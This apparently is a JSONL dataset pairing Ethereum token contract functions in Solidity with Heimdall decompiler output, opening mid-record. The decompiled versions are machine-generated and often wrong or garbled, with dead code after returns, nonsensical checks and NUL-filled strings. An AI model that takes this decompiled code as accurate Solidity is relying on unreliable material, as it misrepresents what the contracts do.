address to,\r\n        bytes calldata data\r\n    ) external;\r\n\r\n    function skim(address to) external;\r\n\r\n    function sync() external;\r\n\r\n    function initialize(address, address) external;\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(\r\n        address indexed token0,\r\n        address indexed token1,\r\n        address pair,\r\n        uint256\r\n    );\r\n\r\n    function feeTo() external view returns (address);\r\n\r\n    function feeToSetter() external view returns (address);\r\n\r\n    function getPair(address tokenA, address tokenB)\r\n        external\r\n        view\r\n        returns (address pair);\r\n\r\n    function allPairs(uint256) external view returns (address pair);\r\n\r\n    function allPairsLength() external view returns (uint256);\r\n\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n\r\n    function setFeeTo(address) external;\r\n\r\n    function setFeeToSetter(address) external;\r\n\r\n    function INIT_CODE_PAIR_HASH() external view returns (bytes32);\r\n}", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x0a2746D0FE88EeB9538183408295c061593E478e", "original_solidity_code": "function name() public view virtual override returns (string memory) {\\n        return _name;\\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x59f53b5298b50696aA8995dda90D6a0bB77dE394", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_f[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x912Abb1B9600d25937CAb8797A3CD5235bf2aAd5", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        owner = newOwner;\\n\\n        emit OwnershipTransferred(msg.sender, newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"UNAUTHORIZED\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x0c;\n        var_d = 0x554e415554484f52495a45440000000000000000000000000000000000000000;\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(msg.sender, address(arg0));\n    }"}
{"contract_address": "0x328E4802787C25995e524C4280a69F985f08ea48", "original_solidity_code": "function manualSwap() external{\\r\\n        uint256 tokenBalance=balanceOf(address(this));\\r\\n        if(tokenBalance>0){\\r\\n          swapTokensForEth(tokenBalance);\\r\\n        }\\r\\n        uint256 ethBalance=address(this).balance;\\r\\n        if(ethBalance>0){\\r\\n          sendETHToFee(ethBalance);\\r\\n        }\\r\\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_f[var_a]);\n        store_e = 0x01000000000000000000000000000000000000000000 | (uint248(store_e));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_l), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_l);\n        address var_b = keccak256(var_a);\n        storage_map_f[var_a] = storage_map_f[var_a];\n        address var_k = storage_map_f[var_a];\n        emit Approval(address(this), address(store_l), storage_map_f[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_f[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_l).code.length);\n        (bool success, bytes memory ret0) = address(store_l).Unresolved_791ac947(var_l); // call\n        store_e = uint248(store_e);\n        require(!address(this).balance);\n        require((store_p == ((store_p * address(this).balance) / address(this).balance)) | !address(this).balance);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x64);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require((store_q == ((store_q * address(this).balance) / address(this).balance)) | !address(this).balance);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x64);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        (bool success, bytes memory ret0) = address(store_o).transfer((store_p * address(this).balance) / 0x64);\n        (bool success, bytes memory ret0) = address(store_r).transfer((store_q * address(this).balance) / 0x64);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x73adcB9F7B46BF6E6f1D027BB13eAAfa158A8A09", "original_solidity_code": "function index() public view returns (uint256 index_) {\r\n        return sGRP.index();\r\n    }", "heimdall_decompiled_code": "function index() public payable returns (uint256) {\n        var_a = 0x2986c0e500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(0x0a2746d0fe88eeb9538183408295c061593e478e).index(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_d == (var_d));\n        var_e = var_d;\n        return var_d;\n    }"}
{"contract_address": "0xd3a031b4752eE83c310988Ad7277A7C2cD0bC631", "original_solidity_code": "function updateBuyFee(uint256 newBuyTax) external onlyOwner {\r\n        _buytax = newBuyTax;\r\n        require(newBuyTax <= 5);\r\n    }", "heimdall_decompiled_code": "function updateBuyFee(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_b = arg0;\n        require(!arg0 > 0x05);\n    }"}
{"contract_address": "0xF3B054a111b9fd6fc5289F473e456531ee89Ba1c", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a]));\n        require(!bytes1(storage_map_b[var_a]));\n        require(store_c > store_d, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_e == ((store_e * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_e * arg1) / arg1) == store_e, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = 0x40 + var_i;\n        var_d = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(address(store_f) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(address(store_f) == (address(arg0)), \"SafeMath: addition overflow\");\n        var_a = address(arg0);\n        var_b = 0x03;\n        require(!(!bytes1(storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((store_e * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (((store_e * arg1) / 0x64) + storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(((store_e * arg1) / 0x64) + storage_map_b[var_a] < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = ((store_e * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_k = (store_e * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (store_e * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_i = 0x40 + var_i;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_i = 0x40 + var_i;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((store_e * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_s = 0x20;\n        uint256 var_t = var_i.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((store_e * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_c > store_h) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_f / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_c > store_j) {\n                if (0 - arg1) {\n                }\n                if (0 - arg1) {\n                }\n                require(!((arg1 - ((store_e * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_c > store_j, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_l) == (address(arg0))) {\n            if (address(store_l) == (address(arg0))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xfc606C8F7141110c3f295a22004D274680A9A029", "original_solidity_code": "function getRefAmount(uint256 _amount) public pure returns (uint256) {\r\n        return _amount * 500 / 10_000;\r\n    }", "heimdall_decompiled_code": "function getRefAmount(uint256 arg0) public pure returns (uint256) {\n        require((arg0 == ((arg0 * 0x01f4) / 0x01f4)) | !0x01f4);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(0x2710);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        uint256 var_c = (arg0 * 0x01f4) / 0x2710;\n        return (arg0 * 0x01f4) / 0x2710;\n    }"}
{"contract_address": "0x2141a81Fbd52a193712C1d77440500e29aB0Fa63", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"SafeMath: multiplication overflow\");\n        require(address(arg0), \"SafeMath: multiplication overflow\");\n        require(arg1 > 0, \"SafeMath: multiplication overflow\");\n        require(address(owner) == (address(msg.sender)), \"SafeMath: multiplication overflow\");\n        require(!(!(address(owner)) == (address(arg0))), \"SafeMath: multiplication overflow\");\n        require(store_b > store_c, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_d == ((store_d * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_d * arg1) / arg1) == store_d, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_g = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_h.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        require(!(bytes1(transferDelayEnabled)), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(address(store_f) == (address(arg0)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(store_g)) == (address(arg0))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        address var_a = tx.origin;\n        var_n = 0x05;\n        require(block.number > storage_map_h[var_a], \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x49;\n        var_l = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = tx.origin;\n        var_n = 0x05;\n        storage_map_h[var_a] = block.number;\n        require(!(address(store_g) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_g) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_g) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_g) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_g) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((store_d * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(storage_map_h[var_a] > (((store_d * arg1) / 0x64) + storage_map_h[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!(((store_d * arg1) / 0x64) + storage_map_h[var_a] < storage_map_h[var_a]), \"SafeMath: addition overflow\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_n = 0x01;\n        storage_map_h[var_a] = ((store_d * arg1) / 0x64) + storage_map_h[var_a];\n        uint256 var_j = (store_d * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (store_d * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        var_h = 0x40 + var_h;\n        var_j = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_h[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_h[var_a] - arg1) > storage_map_h[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        storage_map_h[var_a] = storage_map_h[var_a] - arg1;\n        var_h = 0x40 + var_h;\n        var_r = 0x1e;\n        var_s = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((store_d * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        uint256 var_u = var_h.length;\n        uint256 var_v = 0;\n        var_w = var_m;\n        var_v = 0;\n        if (!(arg1 - ((store_d * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n            if (storage_map_h[var_a] > _maxTaxSwap) {\n            }\n            if (!store_b > store_j) {\n            }\n            if (!storage_map_h[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_g / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_b > store_l) {\n                if (0 - arg1) {\n                }\n                require(!((arg1 - ((store_d * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_b > store_l, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x19;\n        var_l = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_f) == (address(arg0))) {\n            if (address(store_f) == (address(arg0))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x9BF903014c2dbD36f8818eBfc7D840B2cDB6A25b", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x5Dae130C98E4867Eb6721c48D2255F06f3E2a055", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x050355a5eA2d1590C7FBB1aA354b4f698d221b37", "original_solidity_code": "function updateMaxTxnAmount(uint256 newNum) external onlyOwner {\r\n        require(\r\n            newNum >= ((totalSupply() * 5) / 1000) / 1e18,\r\n            \"Cannot set maxTransactionAmount lower than 0.5%\"\r\n        );\r\n        maxTransactionAmount = newNum * (10**18);\r\n    }", "heimdall_decompiled_code": "function updateMaxTxnAmount(uint256 arg0) public view {\n        require(arg0 == arg0);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(totalSupply) & (0x05 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / totalSupply)));\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x03e8);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n    }"}
{"contract_address": "0x693E9C1e8935caf91F006bf5a2FF8a1aB2C569c7", "original_solidity_code": "function howMuchMAGA(address shareholder) external view returns (uint256) {\r\n        return magaPrinter.getUnpaidEarnings(shareholder);\r\n    }", "heimdall_decompiled_code": "function howMuchMAGA(address arg0) public returns (uint256) {\n        require(arg0 == (address(arg0)));\n        var_a = 0x28fd319800000000000000000000000000000000000000000000000000000000;\n        address var_b = address(arg0);\n        (bool success, bytes memory ret0) = address(magaPrinter).Unresolved_28fd3198(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        uint256 var_d = var_c.length;\n        return var_c.length;\n    }"}
